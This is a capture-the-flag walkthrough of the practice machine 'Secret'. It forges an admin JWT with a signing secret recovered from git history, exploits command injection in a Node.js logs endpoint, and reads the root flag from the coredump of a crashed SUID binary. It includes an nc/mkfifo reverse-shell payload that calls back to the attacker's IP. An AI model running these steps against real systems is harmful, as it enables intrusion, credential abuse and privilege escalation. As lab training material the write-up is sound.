# Secret

- Target Machine: 10.10.11.120

## Enumeration

### nmap scan
```bash
# Nmap 7.92SVN scan initiated Thu Nov 11 21:13:48 2021 as: nmap -sC -sV -oN nmap/initial 10.10.11.120
Nmap scan report for 10.10.11.120
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 11 21:14:17 2021 -- 1 IP address (1 host up) scanned in 29.49 seconds
```

### Foothold

The website on port 80 hosts an open source API that can be used for easy user authentication and authorization.
A link redirects us to `/docs`, where we can see the API documentation. After reading it, we can write some python functions that give us an easy-to-use way to interact with the APIs:

```py
import requests as req

url = "http://10.10.11.120:3000"

def register(name, email, password):
    
    data = {
        "name": name,
        "email": email,
        "password": password
    }

    r = req.post(f"{url}/api/user/register", json=data)
    return r.text

def login(email, password):
    
    data = {
        "email": email,
        "password": password
    }

    r = req.post(f"{url}/api/user/login", json=data)
    return r.text

def accessPriv(auth_token):

    headers = {
        "auth-token": auth_token
    }

    r = req.get(f"{url}/api/priv", headers=headers)
    return r.text

def accessLogs(auth_token, file):

    headers = {
        "auth-token": auth_token
    }

    r = req.get(f"{url}/api/logs?file={file}", headers=headers)
    return r.text
```

We can now use these functions to register ourself and login, getting our temporary JWT token.
However, we still can't access `/api/priv` since we still need to be verified as admin.
To achieve this, we can forge a fake admin-authorized JWT token. First, we must find the secret used by the webstite to sign the temporary JWT tokens.


### Forging the JWT admin token

Since this application is open source, we can donwload it's source code from the homepage.
Once extracted the zip contents, we can see a `.env` file stored in it, containing a variable named `TOKEN_SECRET = secret`. After checking the other files, we find out that this variable indeed is the one used to sign the JWT tokens:

```js
/* /local-web/src/routes/verifytoken.js */

const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

However, looks like the secret `TOKEN_SECRET = secret` is only a placeholder. The zip also contains a `.git` folder. We can run `git logs` to check old commits.

```log
[exyss@exyss local-web]$ git log --all --oneline
e297a27 (HEAD -> master) now we can view logs from server <F0><9F><98><83>
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit
```

We can easily see that the commit `67d8da7` has something to do with the .env file (probably it got overwritten).
We can revert the repository to a commit previous to `67d8da7` to get the contents of the old .env file:

```bash
[exyss@exyss local-web]$ git checkout de0a46b
Previous HEAD position was 67d8da7 removed .env for security reasons
HEAD is now at de0a46b added /downloads

[exyss@exyss local-web]$ ls
index.js  node_modules       package.json  routes  validations.js
model     package-lock.json  public        src

[exyss@exyss local-web]$ cat .env 
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

We found the secret! We can now revert the application to the last commit (e297a27).

In the file `/local-web/src/routes/auth.js`, we can see how the application generates the JWT tokens:

```js
router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})
```

Looking through the API documentation, we can also see that the admin's account has the following `_id: 6114654d77f9a54e00fe5777` and `iat: 1618727669`: 

![JWT structure](.img/screen1.png)

We can now generate a fake admin JWT token by copying the website's signing:

```js
/* getAdmintoken.js */

const jwt = require('jsonwebtoken')

SECRET = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"

data = {
    "_id": "6114654d77f9a54e00fe5777",
    "name": "theadmin",
    "email": "root@dasith.works"
}

const adminToken = jwt.sign(data, SECRET)
console.log(adminToken)

// OUTPUT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmZTU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NjY5MzI2fQ.1hRr_W71oIWgvAusPbtcN05Bfp65D5GOlyyV5Wiz9mc
```

Now we can use our Python script's accessPriv function to use the API as admin:

```py
# useAPI.py #
...

adminToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmZTU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NjY5MzI2fQ.p4reWKcE5C8M7OJiA-niq1xaEEwt7vdOdJmZKV1rb7c"
print(accessPriv(adminToken))

# OUTPUT
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

Looking through the source code, we can see that the /api/logs is vulnerable to code injection:

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
})
```

We can use again our python script to trigger an RCE and get a reverse shell

```py
from urllib.parse import quote

adminToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmZTU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NzMxMTI4fQ.6ch_Gtq_Dkmr3oTHl_Ef2f4T8yzQSsYiQGJn5jPd9RU"

my_ip = "10.10.15.47"
my_port = "1234"
revshell = quote(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {my_ip} {my_port} >/tmp/f")

print(accessLogs(adminToken, f";{revshell}"))
```

## Priviledge escalation

After using the `find` command in order to find potential SUID binaries, we find an unusual program named `count` in `/opt/`:

```bash
# use grep -v in order to exclude snap binaries
dasith@secret:~/local-web$ find / -type f -perm -u=s 2>/dev/null | grep -v "snap"

/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count

dasith@secret:~/local-web$ cd /opt/

dasith@secret:/opt$ ls -la

total 56
drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
```

In the same folder we can also find what looks like to be this program's source code:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

As we can see, in the method `filecount()`, the program runs a scan on the file passed as argument by the user, however this file never closes due to `fclose()` never being called. Since this file gets read as root due to the SUID bit being enabled, we can kill the program while it's running to make it crash, preserving the active root priviledge. Due to the precence of `prctl(PR_SET_DUMPABLE, 1)` in the program, the error will get logged in `/var/crash`, enabling us to read the contents of the file that was open while it crashed.

```bash
# From current shell
dasith@secret:/opt$ ./count -p

Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: y

# On another active shell
dasith@secret:~/local-web$ ps aux | grep count
root         821  0.0  0.1 235676  7404 ?        Ssl  14:05   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      1262  0.0  0.0   2488   576 pts/0    S+   14:08   0:00 ./count -p
dasith      1264  0.0  0.0   6432   740 pts/1    S+   14:08   0:00 grep --color=auto count

dasith@secret:~/local-web$ kill -BUS 1262

# Again from the first shell

Path: Bus error (core dumped)

dasith@secret:/opt$ cd /var/crash
dasith@secret:/var/crash$ ls
_opt_count.0.crash  _opt_count.1000.crash  _opt_countzz.0.crash
```

We can now unpack the file `_opt_count.1000.crash`, read it's CoreDump contents and search for the root flag using grep.

```bash
dasith@secret:/var/crash$ mkdir /tmp/crash_log

dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/crash_log

dasith@secret:/var/crash$ cd /tmp/crash_log

dasith@secret:/tmp/crash_log$ ls
Architecture  DistroRelease        ProblemType  ProcEnviron  Signal
CoreDump      ExecutablePath       ProcCmdline  ProcMaps     Uname
Date          ExecutableTimestamp  ProcCwd      ProcStatus   UserGroups

dasith@secret:/tmp/crash_log$ file *
file *
Architecture:        ASCII text, with no line terminators
CoreDump:            ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './count -p', real uid: 1000, effective uid: 0, real gid: 1000, effective gid: 1000, execfn: './count', platform: 'x86_64'
Date:                ASCII text, with no line terminators
DistroRelease:       ASCII text, with no line terminators
ExecutablePath:      ASCII text, with no line terminators
ExecutableTimestamp: ASCII text, with no line terminators
ProblemType:         ASCII text, with no line terminators
ProcCmdline:         ASCII text, with no line terminators
ProcCwd:             ASCII text, with no line terminators
ProcEnviron:         ASCII text
ProcMaps:            ASCII text
ProcStatus:          ASCII text, with very long lines
Signal:              very short file (no magic)
Uname:               ASCII text, with no line terminators
UserGroups:          ASCII text, with no line terminators

dasith@secret:/tmp/crash_log$ strings CoreDump | grep -C 5 /root/root.txt
&^      '
 si!
 si!
 si!
dzi!
/root/root.txt
Total characters = 33
Total words      = 2
Total lines      = 2
@`i!
={i!
dasith@secret:/tmp/crash_log$ strings CoreDump | grep -C 5 root
strings CoreDump | grep -C 5 root
Could not open %s for writing
:*3$"
8hi!
Path: esults a file? [y/N]: words      = 2
Total lines      = 2
oot/root.txt
<Oops someone censored the flag>..b9b214af1795c1998..<Oops someone censored the flag>
TY      '
nY      '
 V      '
CB      '
--
&^      '
 si!
 si!
 si!
dzi!
/root/root.txt
Total characters = 33
Total words      = 2
Total lines      = 2
@`i!
={i!
```